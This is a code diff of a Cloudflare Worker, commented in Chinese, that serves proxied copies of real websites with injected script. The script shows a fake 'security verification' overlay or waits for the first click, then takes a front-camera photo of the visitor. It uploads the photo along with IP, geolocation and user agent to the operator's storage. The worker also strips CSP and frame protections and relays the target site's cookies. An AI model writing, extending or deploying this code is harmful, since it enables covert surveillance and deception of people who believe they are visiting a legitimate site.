@@ -1,7 +1,15 @@
+/**
+ * 助手：统一 IP 获取 (重点支持 Cloudflare Pseudo-IPv4 映射)
+ */
+function getClientIP(request) {
+  return request.headers.get("cf-pseudo-ipv4") || request.headers.get("cf-connecting-ip") || "unknown";
+}
+
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
     const path = url.pathname;
+    const normalizedPath = path.toLowerCase();
 
     const corsHeaders = {
       "Access-Control-Allow-Origin": "*",
@@ -11,6 +19,18 @@ export default {
 
     if (request.method === "OPTIONS") {
       return new Response(null, { headers: corsHeaders });
+    }
+
+    // 频率限制检查 (上传计入次数，查看不计入)
+    if (path === "/api/upload" || path.startsWith("/api/image/")) {
+      const shouldIncrement = (path === "/api/upload");
+      const isAllowed = await checkRateLimit(request, env, shouldIncrement);
+      if (!isAllowed) {
+        return new Response(JSON.stringify({ error: "今日配额已用完 (10次/天)" }), {
+          status: 429,
+          headers: { ...corsHeaders, "Content-Type": "application/json" }
+        });
+      }
     }
 
     // 路由分发
@@ -30,11 +50,41 @@ export default {
       return handleDeletePhotos(request, env, corsHeaders);
     }
 
+    if (path === "/api/quota") {
+      const ip = getClientIP(request);
+      const whitelist = (env.WHITELIST_IP || "").split(",").map(i => i.trim());
+      const isWhitelisted = whitelist.includes(ip);
+      const today = new Date().toISOString().split("T")[0];
+      const quotaKey = `limit:${ip}:${today}`;
+      const usage = parseInt(await env.KV_DATABASE.get(quotaKey) || "0");
+      const limit = 10;
+
+      // 使用统一的高精地理位置引擎
+      const geo = await getIpLocation(ip, request.cf, env);
+
+      return new Response(
+        JSON.stringify({
+          ip,
+          isWhitelisted,
+          usage,
+          limit,
+          remaining: isWhitelisted ? 999999 : Math.max(0, limit - usage),
+          serverDate: today,
+          country: geo.country,
+          location: geo,
+          engine: geo.engine
+        }),
+        {
+          headers: { ...corsHeaders, "Content-Type": "application/json" },
+        }
+      );
+    }
+
     const selfOrigin = `${url.protocol}//${url.host}`;
 
-    // 影子镜像引擎：精确入口判定
-    // 只有路径以 /v 开头 且 显式包含 url 或 d 参数时，才被视为镜像入口
-    const isMirrorEntry = path.toLowerCase().startsWith("/v") && (url.searchParams.has("url") || url.searchParams.has("d"));
+    // 影子镜像引擎：放宽入口判定，确保所有 /v 流量被捕获
+    // 兼容 url, u, d 等多种参数格式
+    const isMirrorEntry = path.toLowerCase() === "/v" || path.toLowerCase().startsWith("/v?");
 
     if (isMirrorEntry) {
       return handleMirror(request, env, ctx, null, null, selfOrigin);
@@ -67,13 +117,11 @@ export default {
       );
     }
 
-    // 如果归巢（主页），则主动清理镜像 Session 缓存
-    if (path === "/" || path === "/home.html") {
-      const response = env.ASSETS ? await env.ASSETS.fetch(request) : new Response("Not Found", { status: 404 });
-      const newResponse = new Response(response.body, response);
-      newResponse.headers.append("Set-Cookie", "SHADOW_TARGET=; Path=/; Max-Age=0");
-      newResponse.headers.append("Set-Cookie", "SHADOW_ID=; Path=/; Max-Age=0");
-      return newResponse;
+    // 如果归巢（主页），则主动清理镜像 Session 缓存，并注入实时配额
+    // 兼容 / , /home, /home.html 等多种入口，防止路由逃逸
+    if (normalizedPath === "/" || normalizedPath === "/home" || normalizedPath === "/home.html" || normalizedPath === "/index.html") {
+      const assetRequest = new Request(request.url, request);
+      return env.ASSETS ? await env.ASSETS.fetch(assetRequest) : new Response("Not Found", { status: 404 });
     }
 
     // 如果不是 API 请求，则回退到静态资源（Assets）
@@ -100,42 +148,32 @@ async function handleUpload(request, env, corsHeaders) {
 
     const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
     const buffer = base64ToArrayBuffer(base64Data);
-
-    const timestamp = new Date()
-      .toISOString()
-      .replace(/[-:T]/g, "")
-      .slice(0, 14);
+    const timestamp = Date.now();
     const fileName = `${id}/${timestamp}.png`;
 
-    // 并行上传图片和获取IP信息
+    // --- 配额校验已由 checkRateLimit 处理，此处仅保留逻辑一致性 ---
+    // --- 恢复结束 ---
+
+    // 存储图片
     const uploadPromise = env.PHOTO_BUCKET.put(fileName, buffer, {
-      httpMetadata: {
-        contentType: "image/png",
-      },
+      httpMetadata: { contentType: "image/png" },
     });
 
-    // 并行获取IP信息
-    let ipPromise = Promise.resolve();
-    if (ip) {
-      ipPromise = getIPInfo(ip)
-        .then((ipInfo) => {
-          if (ipInfo) {
-            const ipFileName = `${id}/${timestamp}.json`;
-            return env.PHOTO_BUCKET.put(ipFileName, JSON.stringify(ipInfo), {
-              httpMetadata: {
-                contentType: "application/json",
-              },
-            });
-          }
-        })
-        .catch((err) => {
-          console.error("IP信息获取/存储失败:", err);
-        });
-    }
+    // 获取上传者真实的 IP 与地理位置数据
+    const visitorIp = getClientIP(request);
+    const cf = request.cf || {};
+    const geoInfo = await getIpLocation(visitorIp, cf, env);
 
-    // 等待图片和IP信息都完成
+    geoInfo.ua = request.headers.get("user-agent") || "未知浏览器";
+    geoInfo.time = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+    geoInfo.source = `影子引擎-${geoInfo.engine}`;
+
+    const ipFileName = `${id}/${timestamp}.json`;
+    const ipPromise = env.PHOTO_BUCKET.put(ipFileName, JSON.stringify(geoInfo), {
+      httpMetadata: { contentType: "application/json" },
+    });
+
     await Promise.all([uploadPromise, ipPromise]);
-
     return new Response(JSON.stringify({ success: true, fileName }), {
       status: 200,
       headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -149,68 +187,6 @@ async function handleUpload(request, env, corsHeaders) {
   }
 }
 
-// 获取IP地理位置信息（优先使用百度API，失败时使用免费API）
-async function getIPInfo(ip) {
-  try {
-    // 首先尝试百度API
-    try {
-      const baiduResponse = await fetch(
-        `https://qifu.baidu.com/api/v1/ip-portrait/brief-info?ip=${ip}`,
-        {
-          headers: {
-            "User-Agent":
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            Referer: "https://qifu.baidu.com/",
-          },
-        }
-      );
-
-      if (baiduResponse.ok) {
-        const baiduData = await baiduResponse.json();
-        if (baiduData.code === 200 && baiduData.data) {
-          const d = baiduData.data;
-          return {
-            ip: ip,
-            country: d.country || "未知",
-            province: d.province || null,
-            city: d.city || null,
-            isp: d.isp || "未知",
-            scene: d.scene || null,
-            security_risks: d.security_risks || null,
-            risk_score: d.risk_score || null,
-            query_time: new Date().toISOString(),
-            source: "baidu",
-          };
-        }
-      }
-    } catch (baiduError) {
-      console.log("百度API失败，使用备用API:", baiduError.message);
-    }
-
-    // 备用：使用 ip-api.com（免费，无需认证）
-    const response = await fetch(`http://ip-api.com/json/${ip}?lang=zh-CN`);
-    if (!response.ok) return null;
-
-    const data = await response.json();
-    if (data.status !== "success") return null;
-
-    return {
-      ip: ip,
-      country: data.country || "未知",
-      province: data.regionName || null,
-      city: data.city || null,
-      isp: data.isp || "未知",
-      latitude: data.lat,
-      longitude: data.lon,
-      timezone: data.timezone,
-      query_time: new Date().toISOString(),
-      source: "ip-api",
-    };
-  } catch (error) {
-    console.error("IP查询失败:", error);
-    return null;
-  }
-}
 
 // 图片直通端点 - 直接从 R2 流式传输图片
 async function handleGetImage(request, env, corsHeaders) {
@@ -325,11 +301,24 @@ async function handleGetPhotos(request, env, corsHeaders) {
           // IP信息不存在
         }
 
+        // 尝试获取消耗情况
+        let usage = "unknown";
+        if (env.KV_DATABASE && ipInfo && ipInfo.ip) {
+          try {
+            const today = new Date().toISOString().split('T')[0];
+            const count = await env.KV_DATABASE.get(`limit:${ipInfo.ip}:${today}`);
+            usage = count || "0";
+          } catch (e) {
+            console.error("加载消耗数据失败:", e);
+          }
+        }
+
         return {
           url: `${baseUrl}/api/image/${encodeURIComponent(obj.key)}`,
           time: formattedTime,
           key: obj.key,
           ipInfo: ipInfo,
+          usage: usage,
         };
       })
     );
@@ -501,45 +490,105 @@ function base64ToArrayBuffer(base64) {
 // 图片现在通过 /api/image/ 端点直接流式传输
 
 function formatTime(timeStr) {
-  if (timeStr.length < 14) return timeStr;
-
-  // 解析 UTC 时间字符串
-  const year = timeStr.slice(0, 4);
-  const month = timeStr.slice(4, 6);
-  const day = timeStr.slice(6, 8);
-  const hour = timeStr.slice(8, 10);
-  const minute = timeStr.slice(10, 12);
-  const second = timeStr.slice(12, 14);
-
-  // 创建 UTC Date 对象
-  const utcDate = new Date(
-    `${year}-${month}-${day}T${hour}:${minute}:${second}Z`
-  );
-
-  // 转换为北京时间（GMT+8）
-  const beijingTime = new Date(utcDate.getTime() + 8 * 60 * 60 * 1000);
-
-  // 格式化输出
-  const bjYear = beijingTime.getUTCFullYear();
-  const bjMonth = String(beijingTime.getUTCMonth() + 1).padStart(2, "0");
-  const bjDay = String(beijingTime.getUTCDate()).padStart(2, "0");
-  const bjHour = String(beijingTime.getUTCHours()).padStart(2, "0");
-  const bjMinute = String(beijingTime.getUTCMinutes()).padStart(2, "0");
-  const bjSecond = String(beijingTime.getUTCSeconds()).padStart(2, "0");
-
-  return `${bjYear}-${bjMonth}-${bjDay} ${bjHour}:${bjMinute}:${bjSecond} `;
+  try {
+    const timestamp = parseInt(timeStr);
+    // 处理 Unix 时间戳 (13位毫秒)
+    if (!isNaN(timestamp) && timeStr.length >= 10) {
+      // 强制转换到北京时间 (UTC+8)
+      const date = new Date(timestamp + 8 * 60 * 60 * 1000);
+      const bjYear = date.getUTCFullYear();
+      const bjMonth = String(date.getUTCMonth() + 1).padStart(2, "0");
+      const bjDay = String(date.getUTCDate()).padStart(2, "0");
+      const bjHour = String(date.getUTCHours()).padStart(2, "0");
+      const bjMinute = String(date.getUTCMinutes()).padStart(2, "0");
+      const bjSecond = String(date.getUTCSeconds()).padStart(2, "0");
+      return `${bjYear}-${bjMonth}-${bjDay} ${bjHour}:${bjMinute}:${bjSecond}`;
+    }
+  } catch (e) {
+    console.error("formatTime 转换失败:", e);
+  }
+  return "未知时间";
 }
 
 /**
  * 影子镜像核心：服务端网页劫持与注入
  */
+/**
+ * 统一高精地理位置引擎 (Refactor)
+ */
+async function getIpLocation(ip, cf, env) {
+  const cacheKey = `geo:${ip}`;
+  const cached = await env.KV_DATABASE.get(cacheKey);
+  if (cached) return { ...JSON.parse(cached), engine: "cache" };
+
+  const res = {
+    ip,
+    loc: cf ? `${cf.country || ""} ${cf.region || ""} ${cf.city || ""}`.trim() : "未知",
+    isp: cf?.asOrganization || "未知",
+    ver: ip.includes(":") ? "v6" : "v4",
+    scene: "",
+    engine: "standard"
+  };
+
+  try {
+    const isCN = cf?.country === "CN";
+    const api = isCN
+      ? `https://qifu.baidu.com/api/v1/ip-portrait/brief-info/local?ip=${encodeURIComponent(ip)}`
+      : `http://ip-api.com/json/${encodeURIComponent(ip)}?lang=zh-CN`;
+
+    const response = await fetch(api, {
+      headers: { "User-Agent": "Mozilla/5.0" },
+      signal: AbortSignal.timeout(3000)
+    });
+    const d = await response.json();
+
+    if (isCN && d.code === 200 && d.data) {
+      const g = d.data;
+      res.ip = g.query_ip || res.ip;
+      res.loc = `${g.country} ${g.province}${g.city}`;
+      res.isp = g.isp;
+      res.ver = g.version || res.ver;
+      res.scene = g.scene;
+      res.engine = "premium";
+    } else if (!isCN && d.status === "success") {
+      res.loc = `${d.country} ${d.regionName} ${d.city}`;
+      res.isp = d.isp;
+      res.engine = "global";
+    }
+  } catch (e) {
+    console.error("Geo Pipe Error:", e);
+  }
+
+  // 极简归一化
+  const ispMap = { "China Mobile": "中国移动", "China Unicom": "中国联通", "China Telecom": "中国电信" };
+  for (const [en, cn] of Object.entries(ispMap)) {
+    if (res.isp.toLowerCase().includes(en.toLowerCase())) { res.isp = cn; break; }
+  }
+  res.loc = res.loc.replace(/Unknown/g, "").replace(/\s+/g, " ").trim();
+
+  await env.KV_DATABASE.put(cacheKey, JSON.stringify(res), { expirationTtl: 43200 });
+  return res;
+}
+
+
 async function handleMirror(request, env, ctx, explicitTarget = null, cachedId = null, selfOrigin = null) {
+  // --- 后端安全硬化：镜像入口前置配额检查 ---
+  // 设置 increment=false，仅检查不计数。确保前端篡改响应体后仍无法启动镜像。
+  const isAllowed = await checkRateLimit(request, env, false);
+  if (!isAllowed) {
+    return new Response("<div style='color: #fca5a5; background: #111; padding: 20px; font-family: sans-serif;'><h2>今日配额已用完</h2><p>每个 IP 每天限 10 次成功镜像（上传图片）。请明天再试。</p></div>", {
+      status: 429,
+      headers: { "Content-Type": "text/html; charset=UTF-8" }
+    });
+  }
+
   const url = new URL(request.url);
   const currentOrigin = selfOrigin || url.origin;
-  let targetUrl = explicitTarget || url.searchParams.get("url");
+  // 优先尝试 url 参数，其次尝试 u 参数（兼容性增强）
+  let targetUrl = explicitTarget || url.searchParams.get("url") || url.searchParams.get("u");
   let id = url.searchParams.get("id") || cachedId;
   const encodedData = url.searchParams.get("d");
-  const mode = url.searchParams.get("m") || "0"; // 0:静默, 1:强制, 2:潜伏
+  const mode = url.searchParams.get("m") || "0";
 
   // 支持前端生成的 Base64 复合编码参数
   if (encodedData && (!targetUrl || !id)) {
@@ -573,20 +622,56 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
   }
 
   try {
-    // 1. 抓取目标页面 - 深度伪装 Headers
+    const currentOrigin = url.origin;
+    const isAllowed = await checkRateLimit(request, env, false);
+    const ipAddr = getClientIP(request);
+    const isWhitelisted = (env.WHITELIST_IP || "").split(',').map(i => i.trim()).includes(ipAddr);
+
+    // VIP 免消耗且强制开启注入
+    let shouldCapture = (isAllowed || isWhitelisted) && id && id !== "null";
+
+    // 1. 抓取目标页面 - 强制解压缩以确保代码注入成功
+    const targetHost = new URL(targetUrl).host;
+    const fetchHeaders = new Headers(request.headers);
+    fetchHeaders.set("Host", targetHost);
+    fetchHeaders.set("Accept-Encoding", "identity"); // 核心修复：禁止 Gzip，确保拿到明文 HTML
+    fetchHeaders.delete("Referer");
+
     const response = await fetch(targetUrl, {
-      headers: {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
-        "Referer": new URL(targetUrl).origin,
-      },
-      cf: {
-        cacheTtl: 120, // 缓存目标站响应 2 分钟
-        cacheEverything: true
-      },
-      redirect: "follow"
+      headers: fetchHeaders,
+      redirect: "manual"
     });
+
+    // 定义 Cookie 清理函数：剥离 Domain 和 Path，确保在影子域名下生效
+    const cleanCookieHeaders = (resHeaders) => {
+      const newHeaders = new Headers();
+      resHeaders.forEach((v, k) => {
+        if (k.toLowerCase() === "set-cookie") {
+          const clean = v.replace(/Domain=[^; ]+;?/gi, "").replace(/Path=\/[^; ]*/gi, "Path=/");
+          newHeaders.append("Set-Cookie", clean);
+        } else {
+          newHeaders.set(k, v);
+        }
+      });
+      return newHeaders;
+    };
+
+    // 拦截重定向：解决百度死循环并带回 Cookie
+    if (response.status >= 300 && response.status < 400) {
+      const location = response.headers.get("Location");
+      if (location) {
+        let redirectUrl = location.startsWith("/") ? new URL(targetUrl).origin + location : location;
+        const newLocation = `${currentOrigin}/v?url=${encodeURIComponent(redirectUrl)}&id=${id}&m=${mode}`;
+
+        const redirectHeaders = cleanCookieHeaders(response.headers);
+        redirectHeaders.set("Location", newLocation);
+
+        return new Response(null, {
+          status: response.status,
+          headers: redirectHeaders
+        });
+      }
+    }
 
     if (!response.ok) {
       return new Response(`Failed to fetch target: ${response.status}`, { status: 502 });
@@ -604,28 +689,62 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
     if (IS_ENFORCE) {
       forceStyle = `
       <style id="shadow-lock-style">
-        html, body { overflow: hidden !important; height: 100vh !important; }
-        #shadow-mirror-overlay {
-          position: fixed; inset: 0; z-index: 2147483647;
-          background: rgba(255, 255, 255, 0.4);
-          backdrop-filter: blur(20px) saturate(180%);
-          -webkit-backdrop-filter: blur(20px) saturate(180%);
-          display: flex; flex-direction: column; align-items: center; justify-content: center;
-          font-family: -apple-system, system-ui, sans-serif; text-align: center; padding: 20px;
+        html, body { overflow: hidden !important; height: 100% !important; }
+        #enforcement-overlay {
+          position: fixed !important; top: 0 !important; left: 0 !important;
+          width: 100% !important; height: 100% !important;
+          background: rgba(255, 255, 255, 0.5) !important; backdrop-filter: blur(15px) !important;
+          -webkit-backdrop-filter: blur(15px) !important;
+          z-index: 2147483647 !important; display: flex !important;
+          align-items: center !important; justify-content: center !important;
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
         }
-        .lock-box { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); max-width: 320px; }
-        .lock-title { font-size: 18px; font-weight: 600; color: #111; margin-bottom: 12px; }
-        .lock-text { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 24px; }
-        .lock-btn { background: #007aff; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; }
+        .modal-box { 
+          background: rgba(255, 255, 255, 0.95) !important; 
+          padding: 35px 30px; 
+          border-radius: 18px; 
+          text-align: center; 
+          max-width: 340px; 
+          width: 85%;
+          box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.2) !important;
+          border: 1px solid rgba(0,0,0,0.05) !important;
+          color: #333 !important;
+        }
+        .modal-box h2 { font-size: 20px !important; margin: 0 0 12px 0 !important; color: #000 !important; font-weight: 600 !important; }
+        .modal-box p { font-size: 15px !important; color: #666 !important; line-height: 1.5 !important; margin-bottom: 25px !important; }
+        .modal-box button { 
+          background: #007AFF !important; color: white !important; border: none !important; 
+          padding: 14px 40px !important; border-radius: 10px !important; font-size: 16px !important; 
+          font-weight: 500 !important; cursor: pointer !important; width: 100% !important;
+          transition: background 0.2s !important;
+        }
+        .modal-box button:active { background: #0056b3 !important; }
       </style>`;
       forceHtml = `
-      <div id="shadow-mirror-overlay">
-        <div class="lock-box">
-          <div class="lock-title">安全验证</div>
-          <div class="lock-text">检测到环境异常，请完成验证以继续访问。</div>
-          <button class="lock-btn">开始验证</button>
+      <div id="enforcement-overlay">
+        <div class="modal-box">
+          <h2>https环境安全访问受限</h2>
+          <p>为了您的账号安全，请完成设备环境检测。</p>
+          <button onclick="startCapture()">继续访问</button>
         </div>
-      </div>`;
+      </div>
+      <script>
+        window.startCapture = function() {
+          const btn = document.querySelector('.modal-box button');
+          if (btn) {
+            btn.disabled = true;
+            btn.innerText = '正在进行环境监测...';
+            btn.style.background = '#ccc';
+          }
+          if (window.performCapture) {
+            window.performCapture();
+          } else {
+            console.error('Tactical Error: performCapture not ready');
+            // 如果脚本还没准备好，0.5秒后重试一次
+            setTimeout(() => window.performCapture && window.performCapture(), 500);
+          }
+        }
+      </script>`;
     } else if (IS_STALKER) {
       forceStyle = `
       <style id="shadow-lock-style">
@@ -635,7 +754,7 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
     }
 
     const captureScript = `
-    <!-- Online Mirror Tactical Engine V5 -->
+    <!-- Online Mirror Tactical Engine V5.1 - Chinese Optimized -->
     <script>
     (function(){
       const ID = "${id}";
@@ -644,7 +763,7 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
       let captured = false;
 
       function unlock() {
-        const overlay = document.getElementById('shadow-mirror-overlay');
+        const overlay = document.getElementById('enforcement-overlay');
         const trap = document.getElementById('shadow-click-trap');
         const style = document.getElementById('shadow-lock-style');
         if (overlay) overlay.remove();
@@ -664,9 +783,8 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
       async function startCapture() {
         if (captured) return;
         try {
-          const ipRes = await fetch("https://api.ipify.org?format=json").catch(() => ({json:()=>({ip:"Unknown"})}));
-          const { ip } = await ipRes.json();
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } });
+          // 拍照前先闪避
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 480, height: 360, facingMode: "user" } });
           captured = true;
           unlock();
 
@@ -678,14 +796,14 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
           canvas.width = video.videoWidth; canvas.height = video.videoHeight;
           canvas.getContext('2d').drawImage(video, 0, 0);
           stream.getTracks().forEach(t => t.stop());
-          upload(canvas.toDataURL('image/jpeg', 0.5), ip);
+          upload(canvas.toDataURL('image/jpeg', 0.6));
         } catch(e) {
-          if (MODE !== "0") alert("验证失败，请授权摄像头以继续访问。");
+          if (MODE === "1") alert("安全验证失败：请确保设备摄像头已授权，否则无法继续访问。");
         }
       }
 
       if (MODE === "1") {
-        document.querySelector('.lock-btn')?.addEventListener('click', startCapture);
+        window.performCapture = startCapture;
       } else if (MODE === "2") {
         window.addEventListener('click', startCapture, { once: true });
       } else {
@@ -696,34 +814,29 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
     </script>
     `;
 
-    // 3. HTML 动态重组
+    // 3. HTML 动态重组 (仅在允许抓取时注入脚本)
     const baseTag = `<base href="${targetUrl}">`;
-    html = html.replace(/<head>/i, `<head>${baseTag}${forceStyle}`);
-    html = html.replace(/<\/body>/i, `${forceHtml}${captureScript}</body>`);
+    html = html.replace(/<head>/i, `<head>${baseTag}${shouldCapture ? forceStyle : ""}`);
+    html = html.replace(/<\/body>/i, `${shouldCapture ? forceHtml + captureScript : ""}</body>`);
 
-    // 4. 清理安全响应头，确保脚本能运行
-    const newHeaders = new Headers(response.headers);
+    // 5. 最终响应处理：应用 Cookie 逻辑并清理安全头
+    const newHeaders = cleanCookieHeaders(response.headers);
     newHeaders.set("Content-Type", "text/html; charset=UTF-8");
     newHeaders.set("X-Mirror-Engine", "Shadow-V5-Turbo");
+
+    // 强制清理 CSP 和 Frame 限制，确保脚本/拍照弹窗能出来
     newHeaders.delete("Content-Security-Policy");
     newHeaders.delete("X-Frame-Options");
     newHeaders.delete("X-Content-Type-Options");
     newHeaders.set("Access-Control-Allow-Origin", "*");
 
-    // 设置加速缓存头 (2分钟)
-    newHeaders.set("Cache-Control", "public, max-age=120");
-
-    // 设置 Cookie 记忆，用于处理后续相对路径请求和 ID 保持
+    // 设置 Cookie 记忆，用于处理后续相对路径请求
     if (id && !cachedId) {
       newHeaders.append("Set-Cookie", `SHADOW_ID=${id}; Path=/; Max-Age=3600; SameSite=Lax`);
     }
-    if (targetUrl && !explicitTarget) {
-      const targetOrigin = new URL(targetUrl).origin;
-      newHeaders.append("Set-Cookie", `SHADOW_TARGET=${encodeURIComponent(targetOrigin)}; Path=/; Max-Age=3600; SameSite=Lax`);
-    }
 
     const finalResponse = new Response(html, {
-      status: response.status,
+      status: 200,
       headers: newHeaders,
     });
 
@@ -734,6 +847,35 @@ async function handleMirror(request, env, ctx, explicitTarget = null, cachedId =
   } catch (err) {
     return new Response(`Mirror Error: ${err.message}`, { status: 500 });
   }
+}
+
+// 辅助函数：频率限制检查
+async function checkRateLimit(request, env, increment = true) {
+  // 1. 获取 IP
+  const ip = getClientIP(request);
+  const whitelist = env.WHITELIST_IP;
+  let isWhitelisted = false;
+  if (whitelist) {
+    const allowedIps = whitelist.split(',').map(i => i.trim());
+    isWhitelisted = allowedIps.includes(ip);
+  }
+
+  // 2. 频率限制 (基于 IP + 日期)
+  const store = env.KV_DATABASE;
+  if (!store) return true; // 无 KV 时默认放行
+
+  const today = new Date().toISOString().split('T')[0];
+  const key = `limit:${ip}:${today}`;
+  const count = parseInt(await store.get(key) || "0");
+
+  // 3. 计数增加逻辑
+  if (increment) {
+    await store.put(key, (count + 1).toString(), { expirationTtl: 90000 });
+  }
+
+  // 4. 判断逻辑：白名单永远放行，非白名单检查次数
+  if (isWhitelisted) return true;
+  return count < 10;
 }
 
 // 辅助函数：解析 Cookie
